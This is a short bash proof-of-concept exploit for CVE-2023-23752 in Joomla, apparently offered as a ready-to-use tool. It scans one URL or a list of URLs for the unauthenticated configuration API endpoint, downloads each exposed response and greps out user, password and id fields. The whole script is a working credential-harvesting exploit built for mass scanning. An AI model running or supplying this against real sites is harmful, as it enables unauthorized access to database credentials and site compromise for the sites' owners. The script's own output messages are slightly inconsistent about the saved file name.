#!/bin/bash

# title: CVE-2023-23752 joomla PoC
# author: whiteOwl
# description:
# send a get request to the URL endpoint and if the request is successful, parse the response for sensitive information.

usage() {
  echo "Usage: $0 [-u <url>] [-l <url list>] [-h]"
  echo "  -u <url>          Specify a single URL to scan"
  echo "  -l <url list>     Specify a file containing a list of URLs to scan"
  echo "  -h                Display this help message"
}

url=""
url_list=""

while getopts u:l:h flag
do
    case "${flag}" in
        u) url=${OPTARG};;
        l) url_list=${OPTARG};;
        h) usage
           exit;;
        *) usage
           exit 1;;
    esac
done

if [[ -n $url ]]; then
    output=$(echo $url | httpx -path '/api/index.php/v1/config/application?public=true' -sc -mc 200,406 -silent)
    if [[ $output == *"200"* || $output == *"406"* ]]; then
        echo "$output"
        curl -o result "$url/api/index.php/v1/config/application?public=true"
        echo "full response is saved in result.txt"
        echo "showing sensitive info recived in response:"
        echo
        cat result | grep -o -E '.{0,20}(user|pass|id).{0,20}' | sed 's/^.\{0,20\}//;s/\(.\{20\}\).*$/\1/'

    fi

elif [[ -n $url_list ]]; then
    while read url; do
        output=$(echo $url | httpx -path '/api/index.php/v1/config/application?public=true' -sc -mc 200,406 -silent)
        if [[ $output == *"200"* || $output == *"406"* ]]; then
            echo "Scanning $url ..."
            curl -o $(echo $url | sed 's|http[s]*://||' | sed 's|/$||').result $url/api/index.php/v1/config/application?public=true
            echo "showing sensitive info received in response for $url :"
            echo
            cat $(echo $url | sed 's|http[s]*://||' | sed 's|/$||').result | grep -o -E '.{0,30}(user|pass|id).{0,30}' | sed 's/^.\{0,30\}//;s/\(.\{30\}\).*$/\1/'
        fi
    done < $url_list
fi